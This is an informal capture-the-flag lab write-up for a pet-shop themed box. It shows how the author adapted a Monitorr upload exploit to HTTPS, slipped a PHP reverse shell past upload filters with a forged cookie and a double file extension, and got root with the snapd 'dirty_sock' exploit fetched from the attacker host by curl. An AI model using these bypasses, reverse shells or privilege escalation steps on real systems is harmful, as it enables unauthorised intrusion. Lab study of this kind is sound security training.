Buckle up, cuz we got a ton to learn from this
Mainly, about enuming TLS cert - web servers
And modifying exploit to work on the same

Initial scans show 22, 2222, 21, 80, 8080, 443, 8096 ports open. Imagine!
Inspection on 22,2222(ssh), 21, 80 all dint seem like there was anything there for us.
on 443, the nmap recon showed 3 branches, `robyns-petshop.thm monitorr.robyns-petshop.thm beta.robyns-petshop.thm dev.robyns-petshop.thm`
Added all these to /etc/hosts as
`IPaddr robyns-petshop.thm monitorr.robyns-petshop.thm beta.robyns-petshop.thm dev.robyns-petshop.thm`
Now, upon visiting all those, the dev had a url ID, that seemed interesting, and the monitorr had the version number, 1.7.6m
Quick search showed the existence of an exploit for that version of monitorr
The exploit crafts a php reverse shell with a GIF mime number, and uploads it to /assets/php/upload.php through POST req
Then does a GET to /assets/data/usrimg/she_ll.php

---
But, this exploit was for http, and the website manager had placed mannual measures to protect against this.

To convert the exploit to https,
```python
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
sess = requests.Session()
sess.verify = False
#Then, in the rest of the file, replace each requests.get or requests.post with sess.get or sess.post
```
This shouldve worked, if additional mannual measures weren't in place
So, we modify the sess.post as r=sess.post() and print(r.text) so that we can see the response

Turns out, there were 3 measures we had to overcome.
1. the checks were looking for a cookie, that says we a human, and hence this upload wasnt working. So,
   ```python
   r = sess.post(url, headers=headers, data=data, cookies={"isHuman": "1"})
   ```
   2. The checks were also filtering out any file extensions that contained php. We can change the file extension to phtml
   3. The checks were splitting the filename over a "." and seeing if the second one had jpg. So, we make the file name as payload.jpg.phtml
and hence the exploit worked, and gave us a reverse shell (had to use port 443, as there was a firewall blocking non-well-known ports)

---
Priv esc
This was unlike anything we had seen.
None of the lin priv esc methods were indicating path forward
ids were normal, appearently, linpeas also wouldnt help

What helped, was `apt list --upgradeable` which said snapd was out of date, with version 2.32.5
searchsploit snapd 2.32.5 showed an exploit, 46362.py, which would create a new user dirty_sock with password dirty_sock, with all commands sudo priv

---
cd to a writable are in the victim's machine, cd /dev/shm and serve the exploit from kali
curl -s http://10.17.34.38/46362.py -o ds.py
chmod +x ds.py
./ds.py

--created the new user, confirm from cat /etc/passwd
then sudo -i to get root shell!